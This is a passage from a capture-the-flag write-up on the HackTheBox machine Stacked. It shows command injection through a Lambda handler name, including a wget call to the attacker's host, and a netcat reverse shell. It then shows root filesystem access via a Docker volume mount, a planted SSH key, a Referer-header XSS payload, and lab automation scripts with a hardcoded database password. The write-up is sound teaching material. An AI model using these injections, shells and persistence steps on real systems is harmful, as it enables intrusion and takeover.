+2021/08/25 20:55:27 CMD: UID=0    PID=1387   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler;$(wget 10.10.14.6/test)")";docker cp "/tmp/localstack/zipfile.0e05eb2c/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
+2021/08/25 20:55:27 CMD: UID=0    PID=1396   | docker cp /tmp/localstack/zipfile.0e05eb2c/. 055307ed86c3a9abf7e78574787249c1162138905afdea2b7590502d4251f4bd:/var/task 
+</code></pre></div></div>
+<p>And a request at my Python web server:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.112 - - [25/Aug/2021 16:55:27] code 404, message File not found
+10.10.11.112 - - [25/Aug/2021 16:55:27] "GET /test HTTP/1.1" 404 -
+</code></pre></div></div>
+<p>This is successful command injection.</p>
+<h4 id="shell-1">Shell</h4>
+<p>I’ve already got <code class="language-plaintext highlighter-rouge">/tmp/.0xdf.sh</code> as a reverse shell in this container. I’ll create a Lambda that calls it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda create-function <span class="nt">--function-name</span> shell <span class="nt">--handler</span> <span class="s1">'index.handler;$(bash /tmp/.0xdf.sh)'</span> <span class="nt">--zip-file</span> fileb://index.zip <span class="nt">--role</span> arn:aws:iam::123456789012:role/lambda-role <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb <span class="nt">--runtime</span> nodejs12.x
+<span class="go">{
+    "FunctionName": "shell",
+    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:shell",
+    "Runtime": "nodejs12.x",
+    "Role": "arn:aws:iam::123456789012:role/lambda-role",
+    "Handler": "index.handler;$(bash /tmp/.0xdf.sh)",
+    "CodeSize": 291,
+    "Description": "",
+    "Timeout": 3,
+    "LastModified": "2021-08-25T20:59:54.009+0000",
+    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
+    "Version": "$LATEST",
+    "VpcConfig": {},
+    "TracingConfig": {
+        "Mode": "PassThrough"
+    },
+    "RevisionId": "52c9494e-accb-47e5-b0ff-d570d9725d49",
+    "State": "Active",
+    "LastUpdateStatus": "Successful",
+    "PackageType": "Zip"
+}
+</span></code></pre></div></div>
+<p>And on invoking with:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>aws lambda invoke <span class="nt">--function-name</span> shell <span class="nt">--endpoint-url</span> http://s3-testing.stacked.htb out.json
+</code></pre></div></div>
+<p>It hangs, but a shell returns:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.11.112] 54300
+bash: cannot set terminal process group (1479): Not a tty
+bash: no job control in this shell
+</span><span class="gp">bash-5.0#</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="shell-as-root-on-stacked">Shell as root on Stacked</h2>
+<h3 id="enumerate-docker">Enumerate Docker</h3>
+<p>Because the container is spawning dockers, at least the root user must have access to the docker socket. As localstack, I could not access it because the user can’t read the certificate:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0$</span><span class="w"> </span>docker ps
+<span class="go">WARNING: Error loading config file:/root/.docker/config.json - stat /root/.docker/config.json: permission denied
+could not read CA certificate "/root/.docker/ca.pem": open /root/.docker/ca.pem: permission denied
+</span></code></pre></div></div>
+<p>root doesn’t have that issue:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker ps
+<span class="go">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
+1af67837dbde        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   4 hours ago         Up 4 hours          127.0.0.1:443-&gt;443/tcp, 127.0.0.1:4566-&gt;4566/tcp, 127.0.0.1:4571-&gt;4571/tcp, 127.0.0.1:8080-&gt;8080/tcp   localstack_main
+</span></code></pre></div></div>
+<p>There are a handful of images available:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker image <span class="nb">ls</span>
+<span class="go">REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
+localstack/localstack-full   0.12.6              7085b5de9f7c        5 weeks ago         888MB
+localstack/localstack-full   &lt;none&gt;              0601ea177088        6 months ago        882MB
+lambci/lambda                nodejs12.x          22a4ada8399c        6 months ago        390MB
+lambci/lambda                nodejs10.x          db93be728e7b        6 months ago        385MB
+lambci/lambda                nodejs8.10          5754fee26e6e        6 months ago        813MB
+</span></code></pre></div></div>
+<h3 id="root-filesystem-access">Root Filesystem Access</h3>
+<p>I’ll try to start one of these containers with <code class="language-plaintext highlighter-rouge">-v /:/mnt</code> which will mount the root <code class="language-plaintext highlighter-rouge">/</code> to <code class="language-plaintext highlighter-rouge">/mnt</code> inside the container. For any of the <code class="language-plaintext highlighter-rouge">lambci/lambda</code> images, it complains about a “Bad handler”:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">-it</span> 22a4ada8399c   
+<span class="go">2021-08-25T21:16:17.809Z        undefined       ERROR   Uncaught Exception      {"errorType":"Runtime.MalformedHandlerName","errorMessage":"Bad handler","stack":["Runtime.MalformedHandlerName: Bad handler","    at _splitHandlerString (/var/runtime/UserFunction.js:43:11)","    at Object.module.exports.load (/var/runtime/UserFunction.js:138:31)","    at Object.&lt;anonymous&gt; (/var/runtime/index.js:43:30)","    at Module._compile (internal/modules/cjs/loader.js:999:30)","    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1027:10)","    at Module.load (internal/modules/cjs/loader.js:863:32)","    at Function.Module._load (internal/modules/cjs/loader.js:708:14)","    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:60:12)","    at internal/main/run_main_module.js:17:47"]}
+START RequestId: 6be74fdd-4b12-1b15-49ba-b6f083015ffe Version: $LATEST
+END RequestId: 6be74fdd-4b12-1b15-49ba-b6f083015ffe
+REPORT RequestId: 6be74fdd-4b12-1b15-49ba-b6f083015ffe  Init Duration: 122.15 ms        Duration: 1.88 ms       Billed Duration: 2 ms   Memory Size: 1536 MB    Max Memory Used: 40 MB
+
+{"errorType":"Runtime.MalformedHandlerName","errorMessage":"Bad handler"}
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">localstack-full</code> image starts right up (using <code class="language-plaintext highlighter-rouge">-d</code> so that it runs in the background):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker run <span class="nt">-d</span> <span class="nt">-v</span> /:/mnt <span class="nt">-it</span> 0601ea177088
+<span class="go">6eac05a5a4305aabb85d268da764f628cab83f9d447992a1bfe5374abfe841c5
+</span></code></pre></div></div>
+<p>The command returns the <code class="language-plaintext highlighter-rouge">CONTAINER ID</code>, which I can also see the start of with <code class="language-plaintext highlighter-rouge">docker ps</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker ps       
+<span class="go">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
+6eac05a5a430        0601ea177088                        "docker-entrypoint.sh"   14 seconds ago      Up 13 seconds       4566/tcp, 4571/tcp, 8080/tcp                                                                           pedantic_golick
+1af67837dbde        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   4 hours ago         Up 4 hours          127.0.0.1:443-&gt;443/tcp, 127.0.0.1:4566-&gt;4566/tcp, 127.0.0.1:4571-&gt;4571/tcp, 127.0.0.1:8080-&gt;8080/tcp   localstack_main
+</span></code></pre></div></div>
+<p>I’ll use <code class="language-plaintext highlighter-rouge">docker exec</code> to drop into this container, and there’s the root filesystem in <code class="language-plaintext highlighter-rouge">/mnt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">hostname</span>
+<span class="go">1af67837dbde
+</span><span class="gp">bash-5.0#</span><span class="w"> </span>docker <span class="nb">exec</span> <span class="nt">-it</span> 6eac05a5a430 bash
+<span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">hostname</span>
+<span class="go">6eac05a5a430
+</span><span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">ls</span> /mnt/
+<span class="go">bin         etc         lib64       mnt         run         sys
+boot        home        libx32      opt         sbin        tmp
+cdrom       lib         lost+found  proc        srv         usr
+dev         lib32       media       root        swap.img    var
+</span><span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">cat</span> /mnt/etc/hostname 
+<span class="go">stacked
+</span></code></pre></div></div>
+<p>I could actually use the Lambda containers, just overriding the entry with <code class="language-plaintext highlighter-rouge">--entrypoint bash</code> (and no <code class="language-plaintext highlighter-rouge">-d</code> since the entry is what I want to interact with):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--entrypoint</span> bash <span class="nt">-it</span> 22a4ada8399c 
+<span class="gp">bash-4.2$</span><span class="w"> </span><span class="nb">cat</span> /mnt/etc/hostname 
+<span class="go">stacked
+</span></code></pre></div></div>
+<p>To access everything, I’ll need to run that entry as root with <code class="language-plaintext highlighter-rouge">-u root</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-5.0#</span><span class="w"> </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--entrypoint</span> bash <span class="nt">-u</span> root <span class="nt">-it</span> 22a4ada8399c
+<span class="gp">bash-4.2#</span><span class="w">
+</span></code></pre></div></div>
+<p>From here I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-4.2#</span><span class="w"> </span><span class="nb">cat</span> /mnt/root/root.txt
+<span class="go">bd97095c************************
+</span></code></pre></div></div>
+<h3 id="shell-2">Shell</h3>
+<p>To get a root shell, I’ll just write my public key into <code class="language-plaintext highlighter-rouge">/mnt/root/.ssh/authorized_keys</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">bash-4.2#</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing"</span> <span class="o">&gt;</span> authorized_keys
+</code></pre></div></div>
+<p>Now I can SSH to Stacked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@stacked.htb
+<span class="go">...[snip]...
+</span><span class="gp">root@stacked:~#</span><span class="w"> 
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="message-app">Message App</h3>
+<h4 id="reconfigure">Reconfigure</h4>
+<p>I want to look more at what’s happening with the local mail application and the XSS. With the root shell on the host, I can reconfigure the web server to be accessible from my VM.</p>
+<p>There are four hosts defined and enabled for Apache:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@stacked:/etc/apache2/sites-enabled#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">001-website.conf  003-proxy.conf  004-portfolio.conf  005-management.conf
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">mail.stacked.htb</code> is in <code class="language-plaintext highlighter-rouge">sites-enables 005-management.conf</code>, which starts as:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;VirtualHost</span> <span class="err">127.0.0.1:80</span><span class="nt">&gt;</span>
+        ServerAdmin webmaster@localhost
+        ServerName mail.stacked.htb
+        DocumentRoot /var/www/management
+        <span class="nt">&lt;Directory</span> <span class="err">/var/www/management</span><span class="nt">&gt;</span>
+                Options -Indexes
+                Require all granted
+                DirectoryIndex dashboard.php
+        <span class="nt">&lt;/Directory&gt;</span>
+<span class="nt">&lt;/VirtualHost&gt;</span>
+</code></pre></div></div>
+<p>On the first line I’ll replace <code class="language-plaintext highlighter-rouge">127.0.0.1</code> with <code class="language-plaintext highlighter-rouge">*</code> and then restart apache (<code class="language-plaintext highlighter-rouge">service apache2 restart</code>).</p>
+<p>Now it loads in Firefox at <code class="language-plaintext highlighter-rouge">http://mail.stacked.htb</code>:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/image-20220316153045584.png"><img alt="image-20220316153045584" src="https://0xdfimages.gitlab.io/img/image-20220316153045584.png"/><em>Click for full size image</em></a></p>
+<h4 id="play-with-mailbox">Play with Mailbox</h4>
+<p>When I send a message, it shows up on a refresh on <code class="language-plaintext highlighter-rouge">mail.stacked.htb</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220316153203938.webp" type="image/webp"/>
+<img alt="image-20220316153203938" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220316153203938.png"/>
+</picture>
+<p>Clicking the link (“asd” in this case) loads the message:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220316153230472.webp" type="image/webp"/>
+<img alt="image-20220316153230472" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220316153230472.png"/>
+</picture>
+<p>The referer header is there. This makes sense if the mailbox is meant to receive from multiple different sites, where the same employee can respond to all of them.</p>
+<h4 id="xss">XSS</h4>
+<p>I’ll update the payload to:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Referer: <span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>On sending that and reloading, the message now pops a message box:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220316153448876.webp" type="image/webp"/>
+<img alt="image-20220316153448876" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220316153448876.png"/>
+</picture>
+<p>There is something that is cleaning up messages, which is why my new message here is still message <code class="language-plaintext highlighter-rouge">id=2</code>. That isn’t always the case, but the cleanup is happening relatively frequently. Still, if I send three messages all together, they are all there:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220316163000341.webp" type="image/webp"/>
+<img alt="image-20220316163000341" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220316163000341.png"/>
+</picture>
+<h3 id="automation">Automation</h3>
+<h4 id="cron">cron</h4>
+<p>I’ll take a quick look at how the XSS is automated to simulate the user viewing the mailbox. The <code class="language-plaintext highlighter-rouge">cron</code> is for the adam user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@stacked:/etc/apache2/sites-enabled#</span><span class="w"> </span>crontab <span class="nt">-l</span> <span class="nt">-u</span> adam
+<span class="go">...[snip]...
+</span><span class="gp">#</span><span class="w"> </span>m h  dom mon dow   <span class="nb">command</span>
+<span class="go">@reboot rm -rf /home/adam/selenium/tmp/* 
+</span><span class="gp">#</span><span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /usr/bin/python3 /home/adam/selenium/check.py
+<span class="go">*/2 * * * * cd /home/adam/selenium &amp;&amp; /bin/sh -c /home/adam/selenium/check.sh
+</span></code></pre></div></div>
+<p>On reboot there’s some clearing of the <code class="language-plaintext highlighter-rouge">tmp</code> folder, and then every two minutes it runs <code class="language-plaintext highlighter-rouge">check.sh</code>.</p>
+<h4 id="checksh">check.sh</h4>
+<p><code class="language-plaintext highlighter-rouge">check.sh</code> basically checks the process list and restarts the browser processes:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+                                                    
+selenium_restart<span class="o">()</span>
+<span class="o">{</span>
+  pkill <span class="nt">-f</span> firefox
+  pkill <span class="nt">-f</span> geckodriver
+  pkill <span class="nt">-f</span> check.py
+  <span class="nb">rm</span> <span class="nt">-rf</span> /home/adam/selenium/tmp/<span class="k">*</span>
+  <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/home/adam/selenium
+  <span class="nv">TMPDIR</span><span class="o">=</span>/home/adam/selenium/tmp /home/adam/selenium/check.py &amp;
+<span class="o">}</span>                      
+
+<span class="k">if</span> <span class="o">!</span> ps auxwww | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>firefox
+<span class="k">then                                 
+    </span>selenium_restart  
+<span class="k">elif</span> <span class="o">!</span> ps auxwww | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>geckodriver
+<span class="k">then                                               
+    </span>selenium_restart             
+<span class="k">elif</span> <span class="o">!</span> ps auxwww | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>check.py
+<span class="k">then
+    </span>selenium_restart
+<span class="k">fi</span>  
+</code></pre></div></div>
+<p>It defines a function called <code class="language-plaintext highlighter-rouge">selenium_restart</code>. <a href="https://www.selenium.dev/">Selenium</a> is a headless automatable browser framework that is typically used for testing. In this function, it kills processes and cleans <code class="language-plaintext highlighter-rouge">tmp</code>, and then calls <code class="language-plaintext highlighter-rouge">check.py</code>. The <code class="language-plaintext highlighter-rouge">if</code>/<code class="language-plaintext highlighter-rouge">elif</code> statements are checking for three different lines in the process list. If any of <code class="language-plaintext highlighter-rouge">firefox</code>, <code class="language-plaintext highlighter-rouge">geckeodriver</code>, and <code class="language-plaintext highlighter-rouge">check.py</code> are <em>not</em> in the process list, then it calls <code class="language-plaintext highlighter-rouge">selenium_restart</code>.</p>
+<h4 id="checkpy">check.py</h4>
+<p><code class="language-plaintext highlighter-rouge">check.py</code> is what actually launches and drives Firefox:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.firefox.options</span> <span class="kn">import</span> <span class="n">Options</span> <span class="k">as</span> <span class="n">FirefoxOptions</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.firefox.firefox_profile</span> <span class="kn">import</span> <span class="n">FirefoxProfile</span>
+<span class="kn">from</span> <span class="n">selenium.webdriver.common.desired_capabilities</span> <span class="kn">import</span> <span class="n">DesiredCapabilities</span>
+<span class="kn">from</span> <span class="n">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">TimeoutException</span>
+<span class="kn">import</span> <span class="n">MySQLdb</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="n">ops</span> <span class="o">=</span> <span class="nc">FirefoxOptions</span><span class="p">()</span>
+<span class="n">ops</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--headless</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">profile</span> <span class="o">=</span> <span class="nc">FirefoxProfile</span><span class="p">()</span>
+<span class="c1">#profile.set_preference('browser.cache.disk.enable', False)
+#profile.set_preference('browser.cache.memory.enable', False)
+#profile.set_preference('browser.cache.offline.enable', False)
+#profile.set_preference('network.cookie.cookieBehavior', 2)
+#profile.set_preference("http.response.timeout", 5)
+#profile.set_preference("dom.max_script_run_time", 5)
+</span><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Firefox</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="sa">r</span><span class="sh">'</span><span class="s">/home/adam/selenium/geckodriver</span><span class="sh">'</span><span class="p">,</span><span class="n">options</span><span class="o">=</span><span class="n">ops</span><span class="p">,</span><span class="n">firefox_profile</span><span class="o">=</span><span class="n">profile</span><span class="p">)</span>
+<span class="c1">#driver.set_page_load_timeout(20)
+</span><span class="n">db</span> <span class="o">=</span> <span class="n">MySQLdb</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">adam</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ReallyStrongSQLPassword@2021</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">contact</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
+    <span class="n">c</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">select * from messages where id &gt; 1;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">STARTING</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">res</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="nb">id</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">trying </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+                <span class="k">if</span> <span class="nb">id</span><span class="p">:</span>
+                    <span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">http://mail.stacked.htb/read-mail.php?id=</span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+                    <span class="n">htmlSource</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="n">page_source</span>
+                    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Cannot access mail for </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Cannot access for </span><span class="si">{</span><span class="nb">id</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+                <span class="k">pass</span>
+            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">c</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">truncate messages;</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">c</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">insert into messages (fullname, email, subject, message, reg_date) values (</span><span class="sh">'</span><span class="s">Jeremy Taint</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">jtaint@stacked.htb</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">S3 Instance Started</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="s">2021-06-25 08:30:00</span><span class="sh">'</span><span class="s">);</span><span class="sh">"</span><span class="p">)</span>
+        <span class="n">db</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
+        <span class="n">c</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+        <span class="n">db</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">no mail</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">driver</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">sh -c /home/adam/selenium/delete_lambda.sh</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">exit</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+<p>The automation is actually reading the messages from the database, fetching a list of ids above one. It then loops over those ids, for each trying to load <code class="language-plaintext highlighter-rouge">read-mail.php?id={id}</code>. On each page load it sleeps five seconds, and then another two. Once all the messages are viewed, it clears the messages table, and then reinserts the first message that leaks the S3 subdomain. It also calls <code class="language-plaintext highlighter-rouge">delete_lambda.sh</code>.</p>
+<h4 id="delete_lambdash">delete_lambda.sh</h4>
+<p>The final script in the automation is responsible for cleaning up lambda scripts in the container:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+curl <span class="nt">--silent</span> <span class="nt">-X</span> DELETE http://127.0.0.1:4566/2015-03-31/functions/all
+</code></pre></div></div>
+<p>It does that by hitting the LocalStack API endpoint to delete all functions.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/03/19/htb-stacked.html"></a>
+</article>
